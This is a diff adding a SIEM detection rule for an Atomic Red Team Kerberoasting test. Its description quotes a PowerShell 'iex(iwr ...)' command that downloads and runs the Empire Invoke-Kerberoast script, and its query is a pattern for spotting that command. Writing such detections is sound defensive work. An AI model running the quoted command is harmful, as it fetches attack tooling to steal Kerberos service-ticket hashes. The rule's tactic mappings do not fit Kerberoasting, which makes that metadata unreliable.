@@ -1,0 +1,39 @@
+[rule]
+author = [ "AtomicRedTeam-Automation",]
+description = "Detection for specific test 'Request for service tickets' (GUID: 3f987809-3681-43c8-bcd8-b3ff3a28533a) of technique T1558.003 (Steal or Forge Kerberos Tickets: Kerberoasting). Test Description: This test uses the Powershell Empire Module: Invoke-Kerberoast.ps1\nThe following are further sources and credits for this attack:\n[Kerberoasting Without Mimikatz source] (https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)\n[Invoke-Kerberoast source] (https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)\nwhen executed successfully , the test displays available services with their hashes. \nIf the testing domain doesn't have any service principal name configured, there is no output. Command/Steps: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\niex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/08cbd27..."
+from = "now-9m"
+rule_id = "40ed45c4-eac5-4dee-afa9-f471b6cfafc4"
+language = "kql"
+name = "Atomic Test: T1558.003 - Request for service tickets"
+output_index = ".siem-signals-default"
+references = [ "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/refs/heads/master/atomics/T1558.003/T1558.003.yaml",]
+risk_score = 50
+severity = "medium"
+tags = [ "AtomicRedTeam", "T1558.003", "3f987809-3681-43c8-bcd8-b3ff3a28533a", "windows",]
+type = "query"
+query = "(process.name : (\\\"powershell.exe\\\", \\\"pwsh.exe\\\", \\\"powershell_ise.exe\\\") OR process.parent.name : (\\\"powershell.exe\\\", \\\"pwsh.exe\\\", \\\"powershell_ise.exe\\\")) AND (powershell.script_block_text : \\\"*[Net.ServicePointManager]::SecurityProtocol*\\\" AND powershell.script_block_text : \\\"*[Net.SecurityProtocolType]::Tls12*\\\" AND powershell.script_block_text : \\\"*iex(iwr*\\\" OR (process.command_line : \\\"*[Net.ServicePointManager]::SecurityProtocol*\\\" AND process.command_line : \\\"*[Net.SecurityProtocolType]::Tls12*\\\" AND process.command_line : \\\"*iex(iwr*\\\"))"
+version = 1
+index = [ "logs-endpoint.events.*", "winlogbeat-*", "logs-windows.*", "logs-linux.*", "logs-macos.*",]
+[[rule.threat]]
+framework = "MITRE ATT&CK"
+[[rule.threat.technique]]
+id = "T1558.003"
+name = "Request for service tickets"
+reference = "https://attack.mitre.org/techniques/T1558/003"
+
+[[rule.threat.tactic]]
+id = "TA0003"
+name = "Persistence"
+reference = "https://attack.mitre.org/techniques/T1558/003"
+
+[[rule.threat.tactic]]
+id = "TA0004"
+name = "Privilege Escalation"
+reference = "https://attack.mitre.org/techniques/T1558/003"
+
+[[rule.threat.tactic]]
+id = "TA0005"
+name = "Defense Evasion"
+reference = "https://attack.mitre.org/techniques/T1558/003"
+
+
